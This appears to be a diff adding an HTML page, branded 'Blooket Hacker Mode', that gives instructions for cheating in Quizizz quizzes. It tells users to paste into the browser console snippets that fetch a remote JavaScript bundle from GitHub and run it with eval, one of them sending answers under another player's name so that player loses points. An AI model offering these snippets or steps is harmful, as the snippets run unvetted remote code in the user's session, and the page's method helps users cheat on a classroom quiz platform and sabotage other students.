@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Pad with Font </title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<style>
+    body {
+        font-family: 'Courier New', Courier, monospace;
+        margin: 0;
+        padding: 0;
+        background-color: #000;
+        color: #00ff00;
+    }
+    .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+        background-color: rgba(0, 0, 0, 0.7);
+        border-bottom: 2px solid #00ff00;
+    }
+    .navbar .logo {
+        font-size: 1.8em;
+        margin: 0;
+        color: #00ff00;
+    }
+    .nav-links {
+        list-style: none;
+        padding: 0;
+        display: flex;
+        gap: 20px; /* Gap between menu items */
+    }
+    .nav-links li {
+        display: inline;
+    }
+    .nav-links a {
+        color: #00ff00;
+        text-decoration: none;
+        padding: 5px 10px;
+        border-radius: 5px;
+        transition: background-color 0.3s, color 0.3s;
+    }
+    .nav-links a:hover {
+        background-color: #00ff00;
+        color: #000;
+    }
+    .chat-container {
+        display: flex;
+    }
+    .sidebar {
+        width: 200px;
+        background-color: rgba(0, 0, 0, 0.8);
+        padding: 20px;
+        border-right: 2px solid #00ff00;
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    }
+    .chat-area {
+        flex-grow: 1;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        background-color: rgba(0, 0, 0, 0.8);
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    }
+    .messages {
+        flex-grow: 1;
+        overflow-y: auto;
+        margin-bottom: 10px;
+        padding: 10px;
+        background-color: #1a1a1a;
+        border: 1px solid #00ff00;
+        border-radius: 5px;
+    }
+    .input-area {
+        display: flex;
+    }
+    .input-area input {
+        flex-grow: 1;
+        padding: 10px;
+        border: 1px solid #00ff00;
+        border-radius: 5px;
+        background-color: #1a1a1a;
+        color: #00ff00;
+    }
+    .input-area button {
+        margin-left: 10px;
+        padding: 10px;
+        background-color: #00ff00;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        color: #000;
+    }
+    .input-area button:hover {
+        background-color: #009900;
+        color: #fff;
+    }
+    .user-list {
+        width: 200px;
+        background-color: rgba(0, 0, 0, 0.8);
+        padding: 20px;
+        border-left: 2px solid #00ff00;
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    }
+</style>
+<body>
+    <div class="container">
+        <h1>Methods</h1>
+        <p>Fetching Quizizz API
+            It should work in Test and Classic mode.
+            Join Quiz Open console and paste this
+        </p>
+        <pre id="codeSnippet">fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/master/dist/bundle.js")
+.then((res) => res.text())
+.then((t) => eval(t))</pre>
+        <button id="copyButton" class="copy-button">
+            <i class="fa-regular fa-paste"></i> Copy Code
+        </button>
+    </div>
+    <div class="container">
+        <h1>Sending answers as someone else</h1>
+        <p>Fetching Quizizz API
+           
+An alternative method is more invasive. Instead of fetching Quizizz API, it sends a random answer to a current question as a different user (consuming his answer); as a response, Quizizz returns a valid answer, which is then displayed to the user.
+
+Join quiz, wait for first question, and open console
+Paste this code to the console
+Enter the user name of any other player (the user won't get points even if they sent a valid answer).
+        </p>
+        <pre id="codeSnippet">fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/oldmethod/dist/bundle.js")
+            .then((res) => res.text()
+            .then((t) => eval(t)))</pre>
+        <button id="copyButton" class="copy-button">
+            <i class="fa-regular fa-paste"></i> Copy Code
+        </button>
+    </div>
+    <script src="script.js"></script>
+    <div class="navbar">
+        <h1 class="logo">Blooket Hacker Mode</h1>
+        <ul class="nav-links">
+            <li><a href="chat.html">chat</a></li>
+            <li><a href="cheats.html">cheats</a></li>
+            <li><a href="chose.html">choose</a></li>
+            <li><a href="unblockers.html">unblockers</a></li>
+        </ul>
+    </div>
+</body>
+</html>
